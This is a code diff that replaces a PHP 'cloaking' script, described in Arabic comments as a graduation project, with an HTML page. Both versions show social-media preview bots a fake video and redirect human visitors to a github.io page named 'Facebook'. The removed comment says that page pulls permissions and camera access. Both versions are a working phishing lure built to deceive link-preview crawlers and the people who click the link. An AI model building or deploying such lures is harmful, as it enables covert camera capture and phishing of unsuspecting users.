@@ -1,30 +1,21 @@
-<?php
-/**
- * مشروع التخرج: نظام التخفي البرمجي (Cloaking)
- * هذا الملف يقوم بالتمييز بين بوتات التواصل الاجتماعي والمستخدم الحقيقي
- */
-
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-$targetPage = "https://appsyria00.github.io/Facebook/"; // صفحة مشروعك الأساسية
-$previewVideo = "../1.mp4"; // مسار الفيديو الذي سيظهر كمعاينة
-
-// 1. فحص ما إذا كان الزائر هو "بوت" (واتساب، فيسبوك، تلجرام)
-if (preg_match('/WhatsApp|facebookexternalhit|TelegramBot|Twitterbot/i', $userAgent)) {
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:title" content="عرض الفيديو التقني">
+    <meta property="og:type" content="video.other">
+    <meta property="og:video" content="https://appsyria00.github.io/Facebook/1.mp4">
+    <meta property="og:video:type" content="video/mp4">
+    <meta property="og:video:width" content="1280">
+    <meta property="og:video:height" content="720">
+    <meta property="og:image" content="https://appsyria00.github.io/Facebook/2.png">
     
-    // إرسال ترويسة تخبر التطبيق أن هذا ملف فيديو حقيقي
-    header('Content-Type: video/mp4');
-    header('Content-Disposition: inline; filename="video.mp4"');
-    header('Content-Length: ' . filesize($previewVideo));
-    
-    // قراءة ملف الفيديو وإرساله للبوت ليظهر زر التشغيل (Play)
-    readfile($previewVideo);
-    exit;
-} 
-
-// 2. إذا كان الزائر إنساناً (يستخدم متصفح عادي)
-else {
-    // توجيهه فوراً لصفحة سحب الصلاحيات والكاميرا
-    header("Location: " . $targetPage);
-    exit;
-}
-?>
+    <script>
+        window.location.href = "https://appsyria00.github.io/Facebook/";
+    </script>
+    <title>Video Preview</title>
+</head>
+<body>
+    <p>جاري تحميل الفيديو... <a href="https://appsyria00.github.io/Facebook/">اضغط هنا للمشاهدة</a></p>
+</body>
+</html>
